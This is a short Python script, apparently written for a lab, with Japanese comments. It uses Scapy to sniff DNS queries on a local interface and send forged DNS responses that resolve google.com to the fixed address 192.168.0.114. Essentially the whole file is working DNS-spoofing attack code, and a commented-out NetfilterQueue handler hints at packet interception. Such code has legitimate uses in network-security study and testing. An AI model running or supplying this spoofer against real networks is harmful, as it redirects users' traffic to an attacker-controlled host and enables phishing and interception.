# _*_ coding: utf-8 _*_
import os
import sys
from scapy.all import *
#from netfilterqueue import NetfilterQueue

def fake_dns_reply(pkt, qname="google.com"):
    """ 偽のDNS応答パケットを作成する """
    ip = IP()
    udp = UDP()
    ip.src = pkt[IP].dst
    ip.dst = pkt[IP].src
    udp.sport = pkt[UDP].dport
    udp.dport = pkt[UDP].sport

    solved_ip = '192.168.0.114' # 偽のIPアドレス
    qd = pkt[UDP].payload
    dns = DNS(id = qd.id, qr = 1, qdcount = 1, ancount = 1, arcount = 1, nscount = 1, rcode = 0)
    dns.qd = qd[DNSQR]
    dns.an = DNSRR(rrname = qname, ttl = 3600, rdlen = 4, rdata = solved_ip)
    dns.ns = DNSRR(rrname = qname, ttl = 3600, rdlen = 4, rdata = solved_ip)
    dns.ar = DNSRR(rrname = qname, ttl = 3600, rdlen = 4, rdata = solved_ip)
    print("\t%s:%s" % (ip.dst, udp.dport))
    send(ip/udp/dns)

def process(pkt):
    """ NFQUEUEから受け取ったパケットを処理する関数 """
 
    """
    packet = IP(pkt.get_payload())
    proto = packet.proto
    # 0x11 = UDP
    if proto is 0x11:
        if packet[UDP].dport is 53:
            print("[*] DNS request")
            dns = packet[UDP].payload
            qname = dns[DNSQR].qname
            print("[*] Requesting for %s" % qname)

    """
    fake_dns_reply(pkt)


def main():
    pack = sniff(filter='udp and port 53', count=1000, iface='enp0s3', prn=process)

main()
